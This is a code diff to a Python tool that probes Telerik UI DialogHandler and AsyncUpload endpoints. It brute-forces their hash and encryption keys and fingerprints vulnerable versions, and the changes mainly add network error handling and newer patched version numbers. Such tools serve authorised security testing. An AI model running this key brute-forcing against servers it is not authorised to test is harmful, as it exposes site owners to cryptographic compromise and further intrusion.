@@ -15,12 +15,14 @@ import requests
 from itertools import chain
 
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
+from urllib3.exceptions import MaxRetryError
 
 from Crypto.Cipher import AES
 from Crypto.Hash import HMAC
 from Crypto.Hash import SHA256
 
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
 
 SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
 sys.path.append(os.path.dirname(SCRIPT_DIR))
@@ -187,6 +189,14 @@ telerik_versions_patched = [
     "2024.4.1112",
     "2024.4.1113",
     "2024.4.1114",
+    "2025.1.211",
+    "2025.1.218",
+    "2025.1.416",
+    "2025.2.520",
+    "2025.2.528",
+    "2025.2.609",
+    "2025.3.812",
+    "2025.3.825",
 ]
 
 
@@ -324,7 +334,7 @@ class AsyncUpload:
                     derive_algos = self.select_derive_algos(telerik_version)
                     for derive_algo in derive_algos:
                         if hasattr(self, "debug") and self.debug:
-                            print(f"[DEBUG] Testing combination:")
+                            print("[DEBUG] Testing combination:")
                             print(f"  - Version: {telerik_version}")
                             print(f"  - Hash Key: {hashkey}")
                             print(f"  - Encryption Key: {key}")
@@ -345,11 +355,15 @@ class AsyncUpload:
                         request.headers.update(self.headers)
                         if hasattr(self, "debug") and self.debug:
                             print(f"[DEBUG] Sending request to: {self.url}")
-                        resp = session.send(request, verify=False)
+                        try:
+                            resp = session.send(request, verify=False)
+                        except (requests.exceptions.RequestException, MaxRetryError):
+                            print(f"Network error connecting to URL: [{self.url}]. Exiting due to connection failure.")
+                            sys.exit(1)
                         if hasattr(self, "debug") and self.debug:
                             print(f"[DEBUG] Response status: {resp.status_code}")
                         if "Could not load file or assembly" in resp.text:
-                            if reported_early_indicator == False:
+                            if not reported_early_indicator:
                                 print(
                                     "Detected early signs that target is likely vulnerable! Continuing to find vulnerable version..."
                                 )
@@ -380,7 +394,7 @@ class DialogHandler:
 
     def probe_version_baseline(self):
         # Get baseline with bogus version
-        b64section_plain = f"Telerik.Web.UI.Editor.DialogControls.DocumentManagerDialog, Telerik.Web.UI, Version=9999.9.999, Culture=neutral, PublicKeyToken=121fae78165ba3d4"
+        b64section_plain = "Telerik.Web.UI.Editor.DialogControls.DocumentManagerDialog, Telerik.Web.UI, Version=9999.9.999, Culture=neutral, PublicKeyToken=121fae78165ba3d4"
         b64section = base64.b64encode(b64section_plain.encode()).decode()
 
         if hasattr(self, "modern_dialog_params") and self.modern_dialog_params:
@@ -393,13 +407,18 @@ class DialogHandler:
         )
         ct = self.telerik_encryptionkey.telerik_encrypt(derivedKey, derivedIV, plaintext)
         dialog_parameters = self.telerik_hashkey.sign_enc_dialog_params(self.hash_key, ct)
-        r = requests.post(
-            self.url,
-            data={"dialogParametersHolder": dialog_parameters},
-            headers=self.headers,
-            verify=False,
-            proxies=self.proxies,
-        )
+        try:
+            r = requests.post(
+                self.url,
+                data={"dialogParametersHolder": dialog_parameters},
+                headers=self.headers,
+                verify=False,
+                proxies=self.proxies,
+            )
+        except (requests.exceptions.RequestException, MaxRetryError):
+            if hasattr(self, "debug") and self.debug:
+                print("[DEBUG] Network error probing version, exiting")
+            sys.exit(1)
         return len(r.text)
 
     def probe_version(self, version, baseline_size=None):
@@ -419,13 +438,20 @@ class DialogHandler:
         )
         ct = self.telerik_encryptionkey.telerik_encrypt(derivedKey, derivedIV, plaintext)
         dialog_parameters = self.telerik_hashkey.sign_enc_dialog_params(self.hash_key, ct)
-        r = requests.post(
-            self.url,
-            data={"dialogParametersHolder": dialog_parameters},
-            headers=self.headers,
-            verify=False,
-            proxies=self.proxies,
-        )
+
+        try:
+            r = requests.post(
+                self.url,
+                data={"dialogParametersHolder": dialog_parameters},
+                headers=self.headers,
+                verify=False,
+                proxies=self.proxies,
+            )
+        except (requests.exceptions.RequestException, MaxRetryError):
+            if hasattr(self, "debug") and self.debug:
+                print("[DEBUG] Network error probing version, exiting")
+            sys.exit(1)
+
         # Extract title if it exists
         title = ""
         if r.text:
@@ -447,7 +473,13 @@ class DialogHandler:
         if hasattr(self, "debug") and self.debug:
             print("\n[DEBUG] Detecting key derivation function")
             print(f"[DEBUG] Sending probe request to: {self.url}")
-        res = requests.post(self.url, data=KDF_probe_data, proxies=self.proxies, headers=self.headers, verify=False)
+        try:
+            res = requests.post(
+                self.url, data=KDF_probe_data, proxies=self.proxies, headers=self.headers, verify=False
+            )
+        except (requests.exceptions.RequestException, MaxRetryError):
+            print(f"Network error connecting to URL: [{self.url}]. Cannot determine key derivation function.")
+            sys.exit(1)
         resp_body = res.text
         if hasattr(self, "debug") and self.debug:
             print(f"[DEBUG] Response status: {res.status_code}")
@@ -469,7 +501,7 @@ class DialogHandler:
             return
         else:
             print(f"Unexpected response encountered: [{resp_body}] aborting.")
-            sys.exit()
+            sys.exit(1)
 
         print("Target is a valid DialogHandler endpoint. Brute forcing Telerik Hash Key...")
 
@@ -491,10 +523,15 @@ class DialogHandler:
             for hash_key_probe, hash_key in hashkey_generator:
                 hashkey_counter += 1
                 data = {"dialogParametersHolder": hash_key_probe}
-                res = requests.post(self.url, data=data, proxies=self.proxies, headers=self.headers, verify=False)
                 if hasattr(self, "debug") and self.debug:
                     print(f"\n[DEBUG] Testing hash key #{hashkey_counter}: {hash_key}")
                     print(f"[DEBUG] Sending request to: {self.url}")
+
+                try:
+                    res = requests.post(self.url, data=data, proxies=self.proxies, headers=self.headers, verify=False)
+                except (requests.exceptions.RequestException, MaxRetryError):
+                    print(f"Network error connecting to URL: [{self.url}]. Exiting due to connection failure.")
+                    sys.exit(1)
 
                 resp_body = urllib.parse.unquote(res.text)
                 if hasattr(self, "debug") and self.debug:
@@ -533,7 +570,13 @@ class DialogHandler:
                     if hasattr(self, "debug") and self.debug:
                         print(f"\n[DEBUG] Testing encryption key #{encryptionkey_counter}: {encryption_key}")
                         print(f"[DEBUG] Sending request to: {self.url}")
-                    res = requests.post(self.url, data=data, proxies=self.proxies, headers=self.headers, verify=False)
+                    try:
+                        res = requests.post(
+                            self.url, data=data, proxies=self.proxies, headers=self.headers, verify=False
+                        )
+                    except (requests.exceptions.RequestException, MaxRetryError):
+                        print(f"Network error connecting to URL: [{self.url}]. Exiting due to connection failure.")
+                        sys.exit(1)
                     if hasattr(self, "debug") and self.debug:
                         print(f"[DEBUG] Response status: {res.status_code}")
 
@@ -548,7 +591,7 @@ class DialogHandler:
                         self.encryption_key = encryption_key
                         break
 
-                if self.encryption_key == None:
+                if self.encryption_key is None:
                     print("\nFAILED: Could not identify encryption key.")
                     return
             else:
@@ -569,7 +612,13 @@ class DialogHandler:
             ct = self.telerik_encryptionkey.telerik_encrypt(derivedKey, derivedIV, plaintext)
             dialog_parameters = self.telerik_hashkey.sign_enc_dialog_params("dummy", ct)
             data = {"dialogParametersHolder": dialog_parameters}
-            baseline_res = requests.post(self.url, data=data, proxies=self.proxies, headers=self.headers, verify=False)
+            try:
+                baseline_res = requests.post(
+                    self.url, data=data, proxies=self.proxies, headers=self.headers, verify=False
+                )
+            except (requests.exceptions.RequestException, MaxRetryError):
+                print(f"Network error connecting to URL: [{self.url}]. Cannot establish baseline for testing.")
+                sys.exit(1)
             baseline_size = len(baseline_res.text)
             baseline_status = baseline_res.status_code
 
@@ -617,7 +666,13 @@ class DialogHandler:
                         print(f"  - Hash Key: {hash_key}")
                         print(f"  - Encryption Key: {encryption_key}")
                         print(f"[DEBUG] Sending request to: {self.url}")
-                    res = requests.post(self.url, data=data, proxies=self.proxies, headers=self.headers, verify=False)
+                    try:
+                        res = requests.post(
+                            self.url, data=data, proxies=self.proxies, headers=self.headers, verify=False
+                        )
+                    except (requests.exceptions.RequestException, MaxRetryError):
+                        print(f"Network error connecting to URL: [{self.url}]. Exiting due to connection failure.")
+                        sys.exit(1)
 
                     # Extract title if it exists
                     title = ""
@@ -771,13 +826,14 @@ def main():
         print("Assuming target is a AsyncUpload Endpoint...")
         asyncupload_endpoint = args.url.split("?")[0] + "?type=RAU"
         try:
-            res = requests.get(asyncupload_endpoint, proxies=proxies, headers=headers, verify=False)
-        except (requests.exceptions.ConnectionError, requests.exceptions.ConnectTimeout):
-            print(f"Error connecting to URL: [{args.url}]")
+            res = requests.get(asyncupload_endpoint, proxies=proxies, headers=headers, verify=False, timeout=10)
+        except (requests.exceptions.RequestException, MaxRetryError):
+            print(f"Network error connecting to URL: [{args.url}]. Please check the URL and network connectivity.")
+            sys.exit(1)
             return
         resp_body = urllib.parse.unquote(res.text)
         if "RadAsyncUpload handler is registered succesfully" not in resp_body:
-            print(f"URL does not appear to be a Telerik UI AsyncUpload Endpoint")
+            print("URL does not appear to be a Telerik UI AsyncUpload Endpoint")
             return
         else:
             print("Target is confirmed to be Telerik UI Async Upload Endpoint")
@@ -815,15 +871,16 @@ def main():
         print("Assuming target is Telerik UI DialogHandler...")
         try:
             res = requests.get(args.url, proxies=proxies, headers=headers, verify=False)
-        except (requests.exceptions.ConnectionError, requests.exceptions.ConnectTimeout):
-            print(f"Error connecting to URL: [{args.url}]")
+        except (requests.exceptions.RequestException, MaxRetryError):
+            print(f"Network error connecting to URL: [{args.url}]. Please check the URL and network connectivity.")
+            sys.exit(1)
             return
         resp_body = urllib.parse.unquote(res.text)
         if "Loading the dialog..." not in resp_body:
-            print(f"URL does not appear to be a Telerik UI DialogHandler")
+            print("URL does not appear to be a Telerik UI DialogHandler")
             return
         else:
-            print(f"Confirmed target is Telerik UI DialogHandler")
+            print("Confirmed target is Telerik UI DialogHandler")
 
         dh = DialogHandler(
             args.url,
